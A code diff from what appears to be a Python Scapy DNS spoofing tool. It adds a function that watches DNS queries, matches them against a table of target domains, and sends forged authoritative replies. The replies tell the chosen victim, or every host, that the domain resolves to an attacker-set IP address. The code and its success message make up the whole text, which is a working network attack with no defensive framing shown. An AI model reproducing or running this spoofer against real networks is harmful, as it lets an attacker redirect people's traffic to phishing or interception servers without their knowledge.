@@ -20,13 +20,26 @@ hosts_dict = {
 domains = hosts_dict.keys()
 
 
-def forge_packet(packet_to_forge, ip):
+def forge_packet(packet_to_forge, fake_server_ip):
     RR_TTL = 60
-    forged_DNSRR = DNSRR(rrname=packet_to_forge[DNS].qd.qname, ttl=RR_TTL, rdlen=4, rdata=ip)
+    forged_DNSRR = DNSRR(rrname=packet_to_forge[DNS].qd.qname, ttl=RR_TTL, rdlen=4, rdata=fake_server_ip)
     forged_packet = IP(src=packet_to_forge[IP].dst, dst=packet_to_forge[IP].src) / \
                     UDP(sport=packet_to_forge[UDP].dport, dport=packet_to_forge[UDP].sport) / \
                     DNS(id=packet_to_forge[DNS].id, qr=1, aa=1, qd=packet_to_forge[DNS].qd, an=forged_DNSRR)
     return forged_packet
+
+def process_dns_packet(packet_to_process, target):
+    # print(packet_to_process[DNS].qd.qname.decode('UTF-8'))
+    # print(packet_to_process[IP].src)
+    current_domain = packet_to_process[DNS].qd.qname.decode('UTF-8')
+    if current_domain in domains:
+        print(packet_to_process)
+        ip = hosts_dict[current_domain]
+        if target is None or packet_to_process[IP].src == target or target=="all":
+            forged_packet = forge_packet(packet_to_process, ip)
+            send(forged_packet, verbose=0)
+            print(
+                f"[*] Forged DNS response sent. Told {packet_to_process[IP].src} that {packet_to_process[DNS].qd.qname.decode('UTF-8')} was at {ip}")
 
 
 def dns_packet_handler(packet_to_process, target):
